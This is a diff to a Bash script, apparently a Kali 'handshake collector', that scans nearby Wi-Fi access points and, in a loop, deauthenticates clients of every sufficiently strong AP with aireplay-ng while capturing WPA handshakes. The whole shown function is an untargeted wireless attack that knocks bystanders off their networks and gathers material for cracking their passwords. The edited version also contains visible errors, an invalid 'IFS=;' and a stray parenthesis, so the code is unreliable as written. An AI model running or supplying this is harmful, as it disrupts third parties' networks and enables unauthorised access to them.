@@ -94,21 +94,21 @@ active() {
   echo "Collect APs..."
   timeout 40 airodump-ng -w /home/kali/hscollector/shakesCollector $interface </dev/null >/dev/null 
   cat /home/kali/hscollector/shakesCollector-01.csv
-  while IFS=, read -r bssid firsttimeseen lasttimeseen channel speed privacy cipher auth power beacons IV LANIP IDlength ESSID; do        
-          if [[ $bssid == "BSSID" ]];then
+  while IFS=; read -r id NetType ESSID BSSID Info Channel Cloaked Encryption Decrypted MaxRate MaxSeenRate Beacon LLC Data Crypt Weak Total Carrier Encoding FirstTime LastTime BestQuality BestSignal; do        
+          if [[ $BSSID == "BSSID" ]];then
                   continue
           fi
-          echo $power"fads"
-          if [[ $power -lt -75 ]]
+          echo $BestQuality $ESSID $BSSID $Channel
+          if [[ $BestQuality -lt -75 ]]
           then
                   continue
           fi
           
-          printf "Attack: $bssid \nChannel: $channel \nPower: $power\nSSID: $ESSID\n"
-          iwconfig $interface channel $channel
-          airodump-ng --bssid $bssid --channel $channel -w /home/kali/hscollector/shakes $interface &>/dev/null &
+          printf "Attack: $BSSID \nChannel: $Channel \nPower: $BestQuality\nSSID: $ESSID\n"
+          iwconfig $interface channel $Channel
+          airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &>/dev/null &
           pid=`echo $!`
-          aireplay-ng -a $bssid -0 10 $interface
+          aireplay-ng -a $BSSID -0 10 $interface
           injectionExitCode=`echo $?`
           if [[ $injectionExitCode -ne 0 ]]
           then
@@ -118,7 +118,7 @@ active() {
           sleep 20
           kill -9 $pid &>/dev/null
           checkHandshakes
-  done < <(tail -n +2  /home/kali/hscollector/shakesCollector-01.csv)
+  done < /home/kali/hscollector/shakesCollector-01.kismet.csv)
   rm /home/kali/hscollector/shakes* >/dev/null
 }
 
